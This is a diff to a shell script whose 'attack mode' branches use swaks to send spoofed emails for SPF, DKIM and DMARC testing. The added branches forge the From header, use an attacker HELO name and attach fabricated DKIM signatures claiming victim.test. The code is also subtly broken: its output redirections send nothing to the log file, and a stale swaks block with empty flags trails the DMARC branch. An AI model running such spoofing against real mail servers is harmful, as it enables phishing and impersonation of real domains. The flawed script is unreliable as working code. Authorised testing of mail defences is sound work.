@@ -45,7 +45,29 @@ if [ "$mode" = "spf" ]; then
   --header "Subject: SPF Test" \
   --body "$message" \
   --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
+
 elif [ "$mode" = "dkim" ]; then
+  swaks --from "$sender" --to "$target" \
+    --server "$MAIL_SERVER_IP" --port 25 \
+    --header "From: $sender_fake" \
+    --header "To: $target" \
+    --helo attacker.attacker.test \
+    --header "Subject: DKIM Test" \
+    --body "$message" \
+    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=selector; h=from:to:subject; bh=invalidhash; b=invaliddata" \
+    --raw > /dev/null 2>&1 | tee "$EMAIL_FILE"
+    
+elif [ "$mode" = "dmarc" ]; then
+  swaks --from "$sender" --to "$target" \
+    --server "$MAIL_SERVER_IP" --port 25 \
+    --header "From: $sender_fake" \
+    --header "To: $target" \
+    --helo attacker.attacker.test \
+    --header "Subject: DMARC Total Failure Test" \
+    --body "$message" \
+    --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.test; s=selector; h=from:to:subject; bh=bad; b=bad" \
+    2>&1 | tee "$EMAIL_FILE"
+
   swaks --from $sender --to $target \
   --server $MAIL_SERVER_IP --port 25 \
   --header \
@@ -54,14 +76,6 @@ elif [ "$mode" = "dkim" ]; then
   --body \
   --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
 
-elif [ "$mode" = "dmarc" ]; then
-  swaks --from $sender --to $target \
-  --server $MAIL_SERVER_IP --port 25 \
-  --header \
-  --helo \
-  --header \
-  --body \
-  --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
 else
   echo
   echo "The argument provided for the attack mode is not available or may have a typo. Fix this and rerun the command!"
